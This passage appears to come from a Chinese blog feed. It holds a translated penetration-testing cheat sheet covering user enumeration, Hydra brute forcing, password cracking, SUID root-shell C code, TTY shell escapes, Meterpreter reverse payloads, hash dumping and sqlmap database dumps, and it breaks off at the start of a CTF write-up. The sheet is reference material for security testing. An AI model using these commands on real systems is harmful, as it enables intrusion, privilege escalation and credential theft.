title="用户名枚举"></a>用户名枚举</h2><p>一些用来枚举目标系统用户名的手法。</p><h3 id="SMB-用户枚举"><a href="#SMB-用户枚举" class="headerlink" title="SMB 用户枚举"></a>SMB 用户枚举</h3><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>python /usr/share/doc/python-impacket-doc/examples/samrdump.py 192.168.XXX.XXX</code></td><td>枚举SMB用户</td></tr><tr><td><code>ridenum.py 192.168.XXX.XXX 500 50000 dict.txt</code></td><td>利用RID cycle枚举SMB用户</td></tr></tbody></table><h3 id="SNMP-用户枚举"><a href="#SNMP-用户枚举" class="headerlink" title="SNMP 用户枚举"></a>SNMP 用户枚举</h3><table><thead><tr><th>COMMAND</th><th>DESCRIPTION</th></tr></thead><tbody><tr><td>`snmpwalk public -v1 192.168.X.XXX 1</td><td>grep 77.1.2.25</td><td>cut -d” “ -f4`</td><td>枚举 SNMP 用户</td></tr><tr><td><code>python /usr/share/doc/python-impacket-doc/examples/samrdump.py SNMP 192.168.X.XXX</code></td><td>枚举 SNMP 用户</td></tr><tr><td><code>nmap -sT -p 161 192.168.X.XXX/254 -oG snmp_results.txt (then grep)</code></td><td>使用nmap搜索SNMP服务器，然后用grep过滤输出</td></tr></tbody></table><h2 id="密码"><a href="#密码" class="headerlink" title="密码"></a>密码</h2><h3 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h3><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>/usr/share/wordlists</code></td><td>Kali 的字典存放路径</td></tr></tbody></table><h2 id="爆破服务"><a href="#爆破服务" class="headerlink" title="爆破服务"></a>爆破服务</h2><h3 id="使用Hydra-爆破FTP"><a href="#使用Hydra-爆破FTP" class="headerlink" title="使用Hydra 爆破FTP"></a>使用Hydra 爆破FTP</h3><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 192.168.X.XXX ftp -V</code></td><td>使用Hydra 爆破FTP</td></tr></tbody></table><h3 id="使用Hydra-爆破POP3"><a href="#使用Hydra-爆破POP3" class="headerlink" title="使用Hydra 爆破POP3"></a>使用Hydra 爆破POP3</h3><table><thead><tr><th>COMMAND</th><th>DESCRIPTION</th></tr></thead><tbody><tr><td><code>hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 192.168.X.XXX pop3 -V</code></td><td>使用Hydra 爆破POP3</td></tr></tbody></table><h3 id="使用Hydra-爆破SMTP"><a href="#使用Hydra-爆破SMTP" class="headerlink" title="使用Hydra 爆破SMTP"></a>使用Hydra 爆破SMTP</h3><table><thead><tr><th>COMMAND</th><th>DESCRIPTION</th></tr></thead><tbody><tr><td><code>hydra -P /usr/share/wordlistsnmap.lst 192.168.X.XXX smtp -V</code></td><td>使用Hydra 爆破SMTP</td></tr></tbody></table><p>使用 <code>-t</code> 限制并发连接数，如 <code>-t 15</code></p><h2 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h2><p>渗透测试中用于密码破解的工具。</p><h3 id="John-The-Ripper-JTR"><a href="#John-The-Ripper-JTR" class="headerlink" title="John The Ripper - JTR"></a>John The Ripper - JTR</h3><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>john --wordlist=/usr/share/wordlists/rockyou.txt hashes</code></td><td>JTR 破解密码</td></tr><tr><td><code>john --format=descrypt --wordlist  /usr/share/wordlists/rockyou.txt hash.txt</code></td><td>JTR 使用字典爆破解密</td></tr><tr><td><code>john --format=descrypt hash --show</code></td><td>JTR 爆破解密</td></tr></tbody></table><h2 id="Windows-渗透测试命令"><a href="#Windows-渗透测试命令" class="headerlink" title="Windows 渗透测试命令"></a>Windows 渗透测试命令</h2><p>See <strong>Windows Penetration Testing Commands</strong>.【待原文补充】</p><h2 id="Linux-渗透测试命令"><a href="#Linux-渗透测试命令" class="headerlink" title="Linux 渗透测试命令"></a>Linux 渗透测试命令</h2><p>参考本站的<a href="https://highon.coffee/blog/linux-commands-cheat-sheet/" target="_blank" rel="noopener">Linux 命令速查表</a> ，该表提供了很多有用的命令。</p><h2 id="编译EXP"><a href="#编译EXP" class="headerlink" title="编译EXP"></a>编译EXP</h2><p>Some notes on compiling exploits.【待原文补充】</p><h3 id="判断C代码适用于Windows平台还是Linux"><a href="#判断C代码适用于Windows平台还是Linux" class="headerlink" title="判断C代码适用于Windows平台还是Linux"></a>判断C代码适用于Windows平台还是Linux</h3><p>通过<code>#include</code> 的文件来判定 </p><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>process.h, string.h, winbase.h, windows.h, winsock2.h</code></td><td>Windows平台代码</td></tr><tr><td><code>arpa/inet.h, fcntl.h, netdb.h, netinet/in.h,  sys/sockt.h, sys/types.h, unistd.h</code></td><td>Linux平台代码</td></tr></tbody></table><h3 id="使用GCC编译Exploit"><a href="#使用GCC编译Exploit" class="headerlink" title="使用GCC编译Exploit"></a>使用GCC编译Exploit</h3><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>gcc -o exploit exploit.c</code></td><td>GCC基本用法</td></tr></tbody></table><h3 id="在64位的Kali上用GCC编译32位的EXP"><a href="#在64位的Kali上用GCC编译32位的EXP" class="headerlink" title="在64位的Kali上用GCC编译32位的EXP"></a>在64位的Kali上用GCC编译32位的EXP</h3><p>很方便地在64位的攻击机器上交叉编译32位的二进制文件。</p><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>gcc -m32 exploit.c -o exploit</code></td><td>在64位的Linux上交叉编译32位的二进制文件</td></tr></tbody></table><h3 id="在-Linux上编译可运行于Windows的exe文件"><a href="#在-Linux上编译可运行于Windows的exe文件" class="headerlink" title="在 Linux上编译可运行于Windows的exe文件"></a>在 Linux上编译可运行于Windows的exe文件</h3><table><thead><tr><th>COMMAND</th><th>DESCRIPTION</th></tr></thead><tbody><tr><td><code>i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe</code></td><td>在 Linux上生成Windows的exe</td></tr></tbody></table><h2 id="SUID-二进制"><a href="#SUID-二进制" class="headerlink" title="SUID 二进制"></a>SUID 二进制</h2><p>通常具有SUID的 C二进制文件要求以超级用户登陆shell，您可以按需更新UID / GID和shell。</p><p>下面是一些可用的shell：</p><h3 id="运行-bin-bash的SUID-C-Shell"><a href="#运行-bin-bash的SUID-C-Shell" class="headerlink" title="运行 /bin/bash的SUID C Shell"></a>运行 /bin/bash的SUID C Shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int main(void)&#123;</span><br><span class="line">       setresuid(0, 0, 0);</span><br><span class="line">       system(&quot;/bin/bash&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="运行-bin-sh的SUID-C-Shell"><a href="#运行-bin-sh的SUID-C-Shell" class="headerlink" title="运行 /bin/sh的SUID C Shell"></a>运行 /bin/sh的SUID C Shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int main(void)&#123;</span><br><span class="line">       setresuid(0, 0, 0);</span><br><span class="line">       system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="构建-SUID-Shell-二进制"><a href="#构建-SUID-Shell-二进制" class="headerlink" title="构建 SUID Shell 二进制"></a>构建 SUID Shell 二进制</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o suid suid.c</span><br></pre></td></tr></table></figure><p>32位</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -o suid suid.c</span><br></pre></td></tr></table></figure><h2 id="反向Shells"><a href="#反向Shells" class="headerlink" title="反向Shells"></a>反向Shells</h2><p>参考 <a href="https://highon.coffee/blog/reverse-shell-cheat-sheet/" target="_blank" rel="noopener">反向 Shell 速查表</a> 。</p><h2 id="TTY-Shells"><a href="#TTY-Shells" class="headerlink" title="TTY Shells"></a>TTY Shells</h2><p>Tips / Tricks to spawn a TTY shell from a limited shell in Linux, useful for running commands like <code>su</code> from reverse shells.</p><p>一些模拟出TTY终端窗口以突破shell限制的技巧，便于从反向shell上执行类似 <code>su</code> 的特殊命令。</p><h3 id="用Python模拟-TTY-Shell的技巧"><a href="#用Python模拟-TTY-Shell的技巧" class="headerlink" title="用Python模拟 TTY Shell的技巧"></a>用Python模拟 TTY Shell的技巧</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo os.system(&apos;/bin/bash&apos;)</span><br></pre></td></tr></table></figure><h3 id="用sh模拟交互式shell"><a href="#用sh模拟交互式shell" class="headerlink" title="用sh模拟交互式shell"></a>用sh模拟交互式shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh -i</span><br></pre></td></tr></table></figure><h3 id="用Perl模拟-TTY-Shell"><a href="#用Perl模拟-TTY-Shell" class="headerlink" title="用Perl模拟 TTY Shell"></a>用Perl模拟 TTY Shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec &quot;/bin/sh&quot;;</span><br><span class="line">perl —e &apos;exec &quot;/bin/sh&quot;;&apos;</span><br></pre></td></tr></table></figure><h3 id="用Ruby模拟-TTY-Shell"><a href="#用Ruby模拟-TTY-Shell" class="headerlink" title="用Ruby模拟 TTY Shell"></a>用Ruby模拟 TTY Shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec &quot;/bin/sh&quot;</span><br></pre></td></tr></table></figure><h3 id="用Lua-模拟TTY-Shell"><a href="#用Lua-模拟TTY-Shell" class="headerlink" title="用Lua 模拟TTY Shell"></a>用Lua 模拟TTY Shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.execute(&apos;/bin/sh&apos;)</span><br></pre></td></tr></table></figure><h3 id="从Vi模拟TTY-Shell"><a href="#从Vi模拟TTY-Shell" class="headerlink" title="从Vi模拟TTY Shell"></a>从Vi模拟TTY Shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:!bash</span><br></pre></td></tr></table></figure><h3 id="用NMAP模拟TTY-Shell"><a href="#用NMAP模拟TTY-Shell" class="headerlink" title="用NMAP模拟TTY Shell"></a>用NMAP模拟TTY Shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!sh</span><br></pre></td></tr></table></figure><h2 id="Metasploit-速查表"><a href="#Metasploit-速查表" class="headerlink" title="Metasploit 速查表"></a>Metasploit 速查表</h2><p>这是一个metasploit方便的速查手册。关于跳板技术可参看 <a href="https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/" target="_blank" rel="noopener">Meterpreter Pivoting</a> 。</p><h3 id="Meterpreter-Payloads"><a href="#Meterpreter-Payloads" class="headerlink" title="Meterpreter Payloads"></a>Meterpreter Payloads</h3><h3 id="Windows-反向meterpreter-payload"><a href="#Windows-反向meterpreter-payload" class="headerlink" title="Windows 反向meterpreter payload"></a>Windows 反向meterpreter payload</h3><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>set payload windows/meterpreter/reverse_tcp</code></td><td>Windows 反向tcp payload</td></tr></tbody></table><h3 id="Windows-VNC-Meterpreter-payload"><a href="#Windows-VNC-Meterpreter-payload" class="headerlink" title="Windows VNC Meterpreter payload"></a>Windows VNC Meterpreter payload</h3><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>set payload windows/vncinject/reverse_tcp`</code>set ViewOnly false`</td><td>Meterpreter Windows VNC Payload</td></tr></tbody></table><h3 id="Linux-反向Meterpreter-payload"><a href="#Linux-反向Meterpreter-payload" class="headerlink" title="Linux 反向Meterpreter payload"></a>Linux 反向Meterpreter payload</h3><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>set payload linux/meterpreter/reverse_tcp</code></td><td>Meterpreter Linux 反向Payload</td></tr></tbody></table><h2 id="Meterpreter速查表"><a href="#Meterpreter速查表" class="headerlink" title="Meterpreter速查表"></a>Meterpreter速查表</h2><p>有用的meterpreter 命令。</p><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>upload file c:\\windows</code></td><td>Meterpreter上传文件到 Windows 目标</td></tr><tr><td><code>download c:\\windows\\repair\\sam /tmp</code></td><td>Meterpreter 从 Windows 目标下载文件</td></tr><tr><td><code>execute -f c:\\windows\temp\exploit.exe</code></td><td>Meterpreter 在目标机器上执行.exe文件——用来执行上传的exp很方便</td></tr><tr><td><code>execute -f cmd -c</code></td><td>创建新的cmd shell通道</td></tr><tr><td><code>ps</code></td><td>Meterpreter显示进程</td></tr><tr><td><code>shell</code></td><td>Meterpreter获取目标shell</td></tr><tr><td><code>getsystem</code></td><td>Meterpreter尝试提权</td></tr><tr><td><code>hashdump</code></td><td>Meterpreter尝试导出目标机器上的哈希</td></tr><tr><td><code>portfwd add –l 3389 –p 3389 –r target</code></td><td>Meterpreter端口转发</td></tr><tr><td><code>portfwd delete –l 3389 –p 3389 –r target</code></td><td>Meterpreter删除端口转发</td></tr></tbody></table><h2 id="常用Metasploit-模块"><a href="#常用Metasploit-模块" class="headerlink" title="常用Metasploit 模块"></a>常用Metasploit 模块</h2><p>最常用的metasploit 模块。</p><h3 id="远程Windows-Metasploit-模块-exploits"><a href="#远程Windows-Metasploit-模块-exploits" class="headerlink" title="远程Windows Metasploit 模块(exploits)"></a>远程Windows Metasploit 模块(exploits)</h3><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>use exploit/windows/smb/ms08_067_netapi</code></td><td>MS08_067 Windows 2k, XP, 2003 远程攻击</td></tr><tr><td><code>use exploit/windows/dcerpc/ms06_040_netapi</code></td><td>MS08_040 Windows NT, 2k, XP, 2003 远程攻击</td></tr><tr><td><code>use exploit/windows/smb/ms09_050_smb2_negotiate_func_index</code></td><td>MS09_050 Windows Vista SP1/SP2 和Server 2008 (x86) 远程攻击</td></tr></tbody></table><h3 id="本地Windows-Metasploit-模块-exploits"><a href="#本地Windows-Metasploit-模块-exploits" class="headerlink" title="本地Windows Metasploit 模块(exploits)"></a>本地Windows Metasploit 模块(exploits)</h3><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>use exploit/windows/local/bypassuac</code></td><td>绕过 Windows 7 上的UAC</td></tr></tbody></table><h3 id="辅助Metasploit-模块"><a href="#辅助Metasploit-模块" class="headerlink" title="辅助Metasploit 模块"></a>辅助Metasploit 模块</h3><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>use auxiliary/scanner/http/dir_scanner</code></td><td>Metasploit HTTP 目录扫描</td></tr><tr><td><code>use auxiliary/scanner/http/jboss_vulnscan</code></td><td>Metasploit JBOSS 漏扫</td></tr><tr><td><code>use auxiliary/scanner/mssql/mssql_login</code></td><td>Metasploit MSSQL 认证扫描</td></tr><tr><td><code>use auxiliary/scanner/mysql/mysql_version</code></td><td>Metasploit MSSQL 版本扫描</td></tr><tr><td><code>use auxiliary/scanner/oracle/oracle_login</code></td><td>Metasploit Oracle 登陆模块</td></tr></tbody></table><h3 id="Metasploit-Powershell-模块"><a href="#Metasploit-Powershell-模块" class="headerlink" title="Metasploit Powershell 模块"></a>Metasploit Powershell 模块</h3><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>use exploit/multi/script/web_delivery</code></td><td>Metasploit powershell payload c传送模块</td></tr><tr><td><code>post/windows/manage/powershell/exec_powershell</code></td><td>Metasploit通过会话上传和执行 powershell脚本</td></tr><tr><td><code>use exploit/multi/http/jboss_maindeployer</code></td><td>Metasploit JBOSS 部署</td></tr><tr><td><code>use exploit/windows/mssql/mssql_payload</code></td><td>Metasploit MSSQL payload</td></tr></tbody></table><h3 id="Windows-后渗透Metasploit-模块"><a href="#Windows-后渗透Metasploit-模块" class="headerlink" title="Windows 后渗透Metasploit 模块"></a>Windows 后渗透Metasploit 模块</h3><p>Windows Metasploit 提权模块。</p><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>run post/windows/gather/win_privs</code></td><td>Metasploit 显示当前用户权限</td></tr><tr><td><code>use post/windows/gather/credentials/gpp</code></td><td>Metasploit 提取 GPP 保存的密码</td></tr><tr><td><code>load mimikatz -&gt; wdigest</code></td><td>Metasplit 加载 Mimikatz</td></tr><tr><td><code>run post/windows/gather/local_admin_search_enum</code></td><td>检查当前用户是否对域内其他机器有管理员权限</td></tr><tr><td><code>run post/windows/gather/smart_hashdump</code></td><td>自动化导出sam 文件，尝试提权等。</td></tr></tbody></table><h2 id="ASCII表速查"><a href="#ASCII表速查" class="headerlink" title="ASCII表速查"></a>ASCII表速查</h2><p>对Web应用渗透测试很有用，或者你被困在火星而需要和NASA通信。（梗自《火星救援》）</p><table><thead><tr><th>ASCII</th><th>字符</th></tr></thead><tbody><tr><td><code>x00</code></td><td>Null Byte 空字节</td></tr><tr><td><code>x08</code></td><td>BS  退格</td></tr><tr><td><code>x09</code></td><td>TAB 水平制表符</td></tr><tr><td><code>x0a</code></td><td>LF 换行</td></tr><tr><td><code>x0d</code></td><td>CR 回车</td></tr><tr><td><code>x1b</code></td><td>ESC</td></tr><tr><td><code>x20</code></td><td>SPC 空格</td></tr><tr><td><code>x21</code></td><td>!</td></tr><tr><td><code>x22</code></td><td>“</td></tr><tr><td><code>x23</code></td><td>#</td></tr><tr><td><code>x24</code></td><td>$</td></tr><tr><td><code>x25</code></td><td>%</td></tr><tr><td><code>x26</code></td><td>&amp;</td></tr><tr><td><code>x27</code></td><td>`</td></tr><tr><td><code>x28</code></td><td>(</td></tr><tr><td><code>x29</code></td><td>)</td></tr><tr><td><code>x2a</code></td><td>*</td></tr><tr><td><code>x2b</code></td><td>+</td></tr><tr><td><code>x2c</code></td><td>,</td></tr><tr><td><code>x2d</code></td><td>-</td></tr><tr><td><code>x2e</code></td><td>.</td></tr><tr><td><code>x2f</code></td><td>/</td></tr><tr><td><code>x30</code></td><td>0</td></tr><tr><td><code>x31</code></td><td>1</td></tr><tr><td><code>x32</code></td><td>2</td></tr><tr><td><code>x33</code></td><td>3</td></tr><tr><td><code>x34</code></td><td>4</td></tr><tr><td><code>x35</code></td><td>5</td></tr><tr><td><code>x36</code></td><td>6</td></tr><tr><td><code>x37</code></td><td>7</td></tr><tr><td><code>x38</code></td><td>8</td></tr><tr><td><code>x39</code></td><td>9</td></tr><tr><td><code>x3a</code></td><td>:</td></tr><tr><td><code>x3b</code></td><td>;</td></tr><tr><td><code>x3c</code></td><td>&lt;</td></tr><tr><td><code>x3d</code></td><td>=</td></tr><tr><td><code>x3e</code></td><td>&gt;</td></tr><tr><td><code>x3f</code></td><td>?</td></tr><tr><td><code>x40</code></td><td>@</td></tr><tr><td><code>x41</code></td><td>A</td></tr><tr><td><code>x42</code></td><td>B</td></tr><tr><td><code>x43</code></td><td>C</td></tr><tr><td><code>x44</code></td><td>D</td></tr><tr><td><code>x45</code></td><td>E</td></tr><tr><td><code>x46</code></td><td>F</td></tr><tr><td><code>x47</code></td><td>G</td></tr><tr><td><code>x48</code></td><td>H</td></tr><tr><td><code>x49</code></td><td>I</td></tr><tr><td><code>x4a</code></td><td>J</td></tr><tr><td><code>x4b</code></td><td>K</td></tr><tr><td><code>x4c</code></td><td>L</td></tr><tr><td><code>x4d</code></td><td>M</td></tr><tr><td><code>x4e</code></td><td>N</td></tr><tr><td><code>x4f</code></td><td>O</td></tr><tr><td><code>x50</code></td><td>P</td></tr><tr><td><code>x51</code></td><td>Q</td></tr><tr><td><code>x52</code></td><td>R</td></tr><tr><td><code>x53</code></td><td>S</td></tr><tr><td><code>x54</code></td><td>T</td></tr><tr><td><code>x55</code></td><td>U</td></tr><tr><td><code>x56</code></td><td>V</td></tr><tr><td><code>x57</code></td><td>W</td></tr><tr><td><code>x58</code></td><td>X</td></tr><tr><td><code>x59</code></td><td>Y</td></tr><tr><td><code>x5a</code></td><td>Z</td></tr><tr><td><code>x5b</code></td><td>[</td></tr><tr><td><code>x5c</code></td><td>\</td></tr><tr><td><code>x5d</code></td><td>]</td></tr><tr><td><code>x5e</code></td><td>^</td></tr><tr><td><code>x5f</code></td><td>_</td></tr><tr><td><code>x60</code></td><td>`</td></tr><tr><td><code>x61</code></td><td>a</td></tr><tr><td><code>x62</code></td><td>b</td></tr><tr><td><code>x63</code></td><td>c</td></tr><tr><td><code>x64</code></td><td>d</td></tr><tr><td><code>x65</code></td><td>e</td></tr><tr><td><code>x66</code></td><td>f</td></tr><tr><td><code>x67</code></td><td>g</td></tr><tr><td><code>x68</code></td><td>h</td></tr><tr><td><code>x69</code></td><td>i</td></tr><tr><td><code>x6a</code></td><td>j</td></tr><tr><td><code>x6b</code></td><td>k</td></tr><tr><td><code>x6c</code></td><td>l</td></tr><tr><td><code>x6d</code></td><td>m</td></tr><tr><td><code>x6e</code></td><td>n</td></tr><tr><td><code>x6f</code></td><td>o</td></tr><tr><td><code>x70</code></td><td>p</td></tr><tr><td><code>x71</code></td><td>q</td></tr><tr><td><code>x72</code></td><td>r</td></tr><tr><td><code>x73</code></td><td>s</td></tr><tr><td><code>x74</code></td><td>t</td></tr><tr><td><code>x75</code></td><td>u</td></tr><tr><td><code>x76</code></td><td>v</td></tr><tr><td><code>x77</code></td><td>w</td></tr><tr><td><code>x78</code></td><td>x</td></tr><tr><td><code>x79</code></td><td>y</td></tr><tr><td><code>x7a</code></td><td>z</td></tr></tbody></table><h2 id="CISCO-IOS-网际操作系统-命令"><a href="#CISCO-IOS-网际操作系统-命令" class="headerlink" title="CISCO IOS(网际操作系统) 命令"></a>CISCO IOS(网际操作系统) 命令</h2><p>收集一些有用的Cisco IOS 命令.</p><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>enable</code></td><td>进入使能模式</td></tr><tr><td><code>conf t</code></td><td>配置终端</td></tr><tr><td><code>(config)# interface fa0/0</code></td><td>配置 FastEthernet 0/0</td></tr><tr><td><code>(config-if)# ip addr 0.0.0.0 255.255.255.255</code></td><td>添加IP到 fa0/0</td></tr><tr><td><code>(config-if)# line vty 0 4</code></td><td>配置 vty line</td></tr><tr><td><code>(config-line)# login</code></td><td>登陆</td></tr><tr><td><code>(config-line)# password YOUR-PASSWORD</code></td><td>设置 telnet 密码</td></tr><tr><td><code># show running-config</code></td><td>显示内存中的运行配置</td></tr><tr><td><code># show startup-config</code></td><td>显示启动配置</td></tr><tr><td><code># show version</code></td><td>显示cisco IOS 版本</td></tr><tr><td><code># show session</code></td><td>显示已打开的会话</td></tr><tr><td><code># show ip interface</code></td><td>显示网卡</td></tr><tr><td><code># show interface e0</code></td><td>显示网络接口细节</td></tr><tr><td><code># show ip route</code></td><td>显示路由</td></tr><tr><td><code># show access-lists</code></td><td>显示access lists</td></tr><tr><td><code># dir file systems</code></td><td>列出可用文件</td></tr><tr><td><code># dir all-filesystems</code></td><td>显示文件信息</td></tr><tr><td><code># dir /all</code></td><td>显示已删除文件</td></tr><tr><td><code># terminal length 0</code></td><td>取消终端输出长度限制</td></tr><tr><td><code># copy running-config tftp</code></td><td>复制运行配置到tftp 服务器</td></tr><tr><td><code># copy running-config startup-config</code></td><td>复制启动配置到运行配置</td></tr></tbody></table><h2 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h2><h3 id="哈希长度"><a href="#哈希长度" class="headerlink" title="哈希长度"></a>哈希长度</h3><table><thead><tr><th>哈希</th><th>长度</th></tr></thead><tbody><tr><td>MD5</td><td><code>16 Bytes</code></td></tr><tr><td>SHA-1</td><td><code>20 Bytes</code></td></tr><tr><td>SHA-256</td><td><code>32 Bytes</code></td></tr><tr><td>SHA-512</td><td><code>64 Bytes</code></td></tr></tbody></table><h3 id="哈希例子"><a href="#哈希例子" class="headerlink" title="哈希例子"></a>哈希例子</h3><p>可以直接使用  <strong>hash-identifier</strong>  命令判断哈希类型，但这里还是举些例子。</p><table><thead><tr><th>哈希</th><th>例子</th></tr></thead><tbody><tr><td>MD5 Hash Example</td><td><code>8743b52063cd84097a65d1633f5c74f5</code></td></tr><tr><td>MD5 $PASS:$SALT Example</td><td><code>01dfae6e5d4d90d9892622325959afbe:7050461</code></td></tr><tr><td>MD5 $SALT:$PASS</td><td><code>f0fda58630310a6dd91a7d8f0a4ceda2:4225637426</code></td></tr><tr><td>SHA1 Hash Example</td><td><code>b89eaac7e61417341b710b727768294d0e6a277b</code></td></tr><tr><td>SHA1 $PASS:$SALT</td><td><code>2fc5a684737ce1bf7b3b239df432416e0dd07357:2014</code></td></tr><tr><td>SHA1 $SALT:$PASS</td><td><code>cac35ec206d868b7d7cb0b55f31d9425b075082b:5363620024</code></td></tr><tr><td>SHA-256</td><td><code>127e6fbfe24a750e72930c220a8e138275656b8e5d8f48a98c3c92df2caba935</code></td></tr><tr><td>SHA-256 $PASS:$SALT</td><td><code>c73d08de890479518ed60cf670d17faa26a4a71f995c1dcc978165399401a6c4</code></td></tr><tr><td>SHA-256 $SALT:$PASS</td><td><code>eb368a2dfd38b405f014118c7d9747fcc97f4f0ee75c05963cd9da6ee65ef498:560407001617</code></td></tr><tr><td>SHA-512</td><td><code>82a9dda829eb7f8ffe9fbe49e45d47d2dad9664fbb7adf72492e3c81ebd3e29134d9bc12212bf83c6840f10e8246b9db54a4859b7ccd0123d86e5872c1e5082f</code></td></tr><tr><td>SHA-512 $PASS:$SALT</td><td><code>e5c3ede3e49fb86592fb03f471c35ba13e8d89b8ab65142c9a8fdafb635fa2223c24e5558fd9313e8995019dcbec1fb584146b7bb12685c7765fc8c0d51379fd</code></td></tr><tr><td>SHA-512 $SALT:$PASS</td><td><code>976b451818634a1e2acba682da3fd6efa72adf8a7a08d7939550c244b237c72c7d42367544e826c0c83fe5c02f97c0373b6b1386cc794bf0d21d2df01bb9c08a</code></td></tr><tr><td>NTLM Hash Example</td><td><code>b4b9b02e6f09a9bd760f388b67351e2b</code></td></tr></tbody></table><h2 id="SQLMap例子"><a href="#SQLMap例子" class="headerlink" title="SQLMap例子"></a>SQLMap例子</h2><p>小型 SQLMap 速查表：</p><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>sqlmap -u http://meh.com --forms --batch --crawl=10  --cookie=jsessionid=54321 --level=5 --risk=3</code></td><td>自动化sqlmap扫描</td></tr><tr><td><code>sqlmap -u TARGET -p PARAM --data=POSTDATA --cookie=COOKIE  --level=3 --current-user --current-db --passwords  --file-read=&quot;/var/www/blah.php&quot;</code></td><td>指定目标的sqlmap scan</td></tr><tr><td><code>sqlmap -u &quot;http://meh.com/meh.php?id=1&quot; --dbms=mysql --tech=U --random-agent --dump</code></td><td>使用联合查询技术扫描mysql后端的基于报错的注入 ，使用随机UA，导出数据库</td></tr><tr><td><code>sqlmap -o -u &quot;http://meh.com/form/&quot; --forms</code></td><td>检测可能存在注入点表单</td></tr><tr><td><code>sqlmap -o -u &quot;http://meh/vuln-form&quot; --forms  -D database-name -T users --dump</code></td><td>导出指定数据库的user表并尝试破解哈希。</td></tr></tbody></table>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>Meepwn2018：MaplStory——以Cookie为跳板的Session文件包含</title>
      <link href="/180721MeepwnMaplStory/"/>
      <url>/180721MeepwnMaplStory/</url>
      
        <content type="html"><![CDATA[<p><strong>本文首发 <a href="https://xz.aliyun.com/t/2463" target="_blank" rel="noopener">先知社区</a> ，转载请注明链接。</strong> </p><p>本题考察PHP源码审计。主要有两个缺陷：使用ECB模式进行AES加密导致的CPA（选择明文攻击）和 文件包含。有两处可以向文件写入内容以供包含，但均被过滤，最终通过以未被过滤的Cookie为跳板连接两处文件包含来写入Shell。文末还介绍了一种深入利用一处文件包含getshell的解法。</p><h1 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h1><p>打开 <a href="http://178.128.87.16" target="_blank" rel="noopener">http://178.128.87.16</a> 是一个登陆页面，注册账户后有四个页面，<code>HOME</code> 是欢迎页，<code>CHARACTER</code> 页可以和宠物角色互动，但账户刚注册完是没有宠物的，需要获取ADMIN权限后自行添加， <code>SETTING</code> 页可以修改用户名和选择头像，<code>GAME</code> 页是一个Flash小游戏，和本题无关。</p><p>题目提供了源码下载，可以从 <a href="https://ctf.meepwn.team/attachments/web/MaplStory_f7056ad79428f636ca4e92f283727818ecc0dd70ecb95f8a12e2764df0946022.zip" target="_blank" rel="noopener">这里</a> 或 <a href="https://github.com/findneo/ctfgodown/blob/master/20180718-Meepwn%20CTF%20Quals%202018/WEB/MaplStory_f7056ad79428f636ca4e92f283727818ecc0dd70ecb95f8a12e2764df0946022.zip" target="_blank" rel="noopener">备用地址</a> 下载。</p><p><img src="1532072388162.png" alt="1532072388162"></p><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="index-php"><a href="#index-php" class="headerlink" 